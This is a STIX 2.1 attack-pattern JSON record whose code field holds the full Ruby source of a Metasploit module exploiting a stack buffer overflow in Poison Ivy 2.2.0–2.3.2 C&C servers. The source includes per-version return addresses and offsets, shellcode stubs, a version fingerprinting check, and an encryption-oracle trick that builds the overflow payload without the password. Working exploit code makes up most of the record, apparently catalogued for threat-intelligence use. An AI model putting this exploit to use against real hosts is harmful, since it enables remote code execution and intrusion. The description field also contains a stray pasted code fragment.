{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8c13dabc-ce9f-4150-be70-b9c0aa6be699",
    "created": "2024-08-14T16:47:17.438683Z",
    "modified": "2024-08-14T16:47:17.438687Z",
    "name": "Poison Ivy Server Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the Poison Ivy 2.2.0 to 2.3.2 C&C server. The exploit does not need to know the password chosen for the bot/server communication.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/poisonivy_bof.rb",
            "external_id": "poisonivy_bof.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.signal11.eu/en/research/articles/targeted_2010.pdf"
        },
        {
            "source_name": "reference",
            "url": "http://samvartaka.github.io/malware/2015/09/07/poison-ivy-reliable-exploitation/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Poison Ivy Server Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in the Poison Ivy 2.2.0 to 2.3.2 C&C server.\n        The exploit does not need to know the password chosen for the bot/server communication.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Andrzej Dereszowski', # Vulnerability Discovery\n          'Gal Badishi', # Exploit and Metasploit module\n          'juan vazquez', # Testing and little of Metasploit-fu\n          'Jos Wetzels' # Added support for Poison Ivy 2.2.0 to 2.3.1, removed need for brute forcing by (ab)using C&C challenge-response as encryption oracle\n        ],\n      'References'     =>\n        [\n          [ 'OSVDB', '83774' ],\n          [ 'EDB', '19613' ],\n          [ 'URL', 'http://www.signal11.eu/en/research/articles/targeted_2010.pdf' ],\n          [ 'URL', 'http://samvartaka.github.io/malware/2015/09/07/poison-ivy-reliable-exploitation/' ],\n        ],\n      'DisclosureDate' => '2012-06-24',\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Payload'        =>\n        {\n          'StackAdjustment'   => -4000,\n          'Space'             => 10000\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'Poison Ivy 2.2.0 on Windows XP SP3 / Windows 7 SP1',\n            {\n              'Ret' => 0x00425E5D, # jmp esp from \"Poison Ivy 2.2.0.exe\"\n              'RWAddress' => 0x00401000,\n              'Offset' => 0x8069,\n              'PayloadOffset' => 0x75,\n              'jmpPayload' => \"\\x81\\xec\\xFC\\x7F\\x00\\x00\\xff\\xe4\" # sub esp,0x7FFC # jmp esp\n            }\n          ],\n\n          [\n            'Poison Ivy 2.3.0 on Windows XP SP3 / Windows 7 SP1',\n            {\n              'Ret' => 0x00442749, # jmp esp from \"Poison Ivy 2.3.0.exe\"\n              'RWAddress' => 0x00401000,\n              'Offset' => 0x8069,\n              'PayloadOffset' => 0x75,\n              'jmpPayload' => \"\\x81\\xec\\xFC\\x7F\\x00\\x00\\xff\\xe4\" # sub esp,0x7FFC # jmp esp\n            }\n          ],\n\n          [\n            'Poison Ivy 2.3.1, 2.3.2 on Windows XP SP3 / Windows 7 SP1',\n            {\n              'Ret' => 0x0041AA97, # jmp esp from \"Poison Ivy 2.3.1.exe\" and \"Poison Ivy 2.3.2.exe\"\n              'RWAddress' => 0x00401000,\n              'Offset' => 0x806D,\n              'PayloadOffset' => 0x75,\n              'jmpPayload' => \"\\x81\\xec\\x00\\x80\\x00\\x00\\xff\\xe4\" # sub esp,0x8000 # jmp esp\n            }\n          ]\n        ],\n      'DefaultTarget'  => 2\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(3460)\n      ])\n\n  end\n\n  def check\n    # camellia block size\n    block_size = 16\n    # number of blocks in challenge\n    block_count = 16\n    challenge = (\"\\x00\" * block_size * block_count)\n\n    indicator = {}\n    # 0x0000113e as first 4 bytes on PI 2.1.0\n    indicator[[0x0000113e].pack('V')] = '2.1.0'\n    # 0x00001212 as first 4 bytes on PI 2.1.1\n    indicator[[0x00001212].pack('V')] = '2.1.1'\n    # 0x000013f6 as first 4 bytes on PI 2.1.2\n    indicator[[0x000013f6].pack('V')] = '2.1.2'\n\n    # 0x000013e0 as 4 bytes after challenge on PI 2.2.0\n    indicator[[0x000013e0].pack('V')] = '2.2.0'\n    # 0x00001470 as 4 bytes after challenge on PI 2.3.0\n    indicator[[0x00001470].pack('V')] = '2.3.0'\n    # 0x000015D0 as 4 bytes after challenge on PI 2.3.1/2.3.2\n    indicator[[0x000015D0].pack('V')] = '2.3.1/2.3.2'\n\n    connect\n    sock.put(challenge)\n    response = sock.get_once(256)\n\n    if response && response.length == 256\n      # Poison Ivy >= 2.2.0 Challenge Response uses Camellia in ECB mode which means identical plaintext blocks\n      # map to identical ciphertext blocks. A challenge composed of identical blocks will thus result in a response of identical blocks.\n      first_block = response[0, 16]\n      (1..15).each do |index|\n        unless response[index * 16, 16] == first_block\n          vprint_status(\"Response doesn't match Poison Ivy Challenge-Response format.\")\n          return Exploit::CheckCode::Safe\n        end\n      end\n\n      response = sock.get_once(4)\n    end\n\n    disconnect\n\n    if response && response.length == 4\n      disconnect\n      if indicator.key?(response)\n        version = indicator[response]\n        vprint_status(\"Poison Ivy C&C version #{version} detected.\")\n        return Exploit::CheckCode::Appears\n      end\n    end\n\n    vprint_status(\"Response doesn't match Poison Ivy Challenge-Response protocol.\")\n    Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    # Handshake\n    connect\n    print_status('Performing handshake...')\n\n    # plaintext header\n    plaintext_header = \"\\x01\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\xbb\\x00\\x00\\x00\\xc2\\x00\\x00\\x00\\xc2\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n\n    # crafted challenge (first 32 bytes is our plaintext header), abuse challenge-response as encryption oracle\n    challenge = plaintext_header + (\"\\x00\" * (256 - 32))\n    sock.put(challenge)\n    # response = encrypt(challenge, key)\n    response = sock.get_once\n\n    # since encryption is done using Camellia in ECB mode, we can cut and paste the first 32 bytes (our header inside the crafted challenge) without knowing the key\n    encrypted_header = response[0, 32]\n\n    # Don't change the nulls, or it might not work\n    xploit  = ''\n    xploit << encrypted_header\n    xploit << \"\\x00\" * (target['PayloadOffset'] - xploit.length)\n    xploit << payload.encoded\n    xploit << \"\\x00\" * (target['Offset'] - xploit.length)\n    xploit << [target.ret].pack('V') # ret to a jmp esp opcode\n    xploit << [target['RWAddress']].pack('V') # Readable/writeable - will be cleaned by original ret 4 (esp will point to the next dword)\n    xploit << target['jmpPayload'] # This comes immediately after ret - it is a setup for the payload (jmp back)\n\n    # The disconnection triggers the exploit\n    print_status('Sending exploit...')\n    sock.put(xploit)\n    select(nil,nil,nil,5)\n    disconnect\n  end\nend\n\n=begin\n\n* ROP version of exploit(): Has been discarded at the moment because of two reasons:\n\n(1) Poison Ivy fails to run on DEP enabled systems (maybe due to the unpacking process)\n(2) When trying a unpacked version on DEP enabled systems windows/exec payload runs, but not meterpreter\n\n=end\n",
    "x_mitre_disclosure_date": "2012-06-24",
    "x_mitre_platforms": [
        "win'"
    ]
}